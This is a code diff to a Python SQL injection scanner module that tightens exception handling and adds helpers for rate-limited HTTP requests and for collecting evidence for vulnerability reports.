@@ -1207,7 +1539,8 @@ class SQLInjectionScanner(BaseScannerModule):
         try:
             result = subprocess.run(['sqlmap', '--version'], capture_output=True, timeout=5)
             return result.returncode == 0
-        except:
+        except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
+            self.logger.debug(f"SQLMap not available: {e}")
             return False
     
     async def _passive_sql_check(self, url: str) -> List[Vulnerability]:
@@ -1239,8 +1572,8 @@ class SQLInjectionScanner(BaseScannerModule):
                             )
                         )
                         break
-        except:
-            pass
+        except (httpx.HTTPError, asyncio.TimeoutError) as e:
+            self.logger.debug(f"Passive SQL check failed: {e}")
         
         return vulnerabilities
     
@@ -1268,4 +1601,43 @@ class SQLInjectionScanner(BaseScannerModule):
                             unique_vulns[i] = vuln
                         break
         
+        
         return unique_vulns
+    
+    async def _rate_limited_request(self, client: httpx.AsyncClient, url: str, 
+                                   config: Optional[ScanConfig], timeout: int = 15) -> httpx.Response:
+        """Make rate-limited request."""
+        # Apply rate limiting if config is provided
+        if config and hasattr(config, 'rate_limit'):
+            rate_limit = config.rate_limit
+            if self._last_request_time > 0:
+                elapsed = time.time() - self._last_request_time
+                min_interval = 1.0 / rate_limit
+                if elapsed < min_interval:
+                    await asyncio.sleep(min_interval - elapsed)
+        
+        self._last_request_time = time.time()
+        
+        # Use config timeout if available, otherwise use provided timeout
+        actual_timeout = min(config.timeout if config else timeout, timeout)
+        return await client.get(url, timeout=actual_timeout)
+    
+    def _collect_evidence(self, response: httpx.Response, payload: str, 
+                         additional_data: Dict[str, Any] = None) -> Dict[str, Any]:
+        """Collect comprehensive evidence for vulnerability reporting."""
+        evidence = {
+            'request_url': str(response.url),
+            'request_method': response.request.method,
+            'status_code': response.status_code,
+            'response_length': len(response.text),
+            'response_time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else None,
+            'headers': dict(response.headers),
+            'payload_used': payload,
+            'timestamp': datetime.utcnow().isoformat(),
+            'response_snippet': response.text[:500] if response.text else None,
+        }
+        
+        if additional_data:
+            evidence.update(additional_data)
+        
+        return evidence
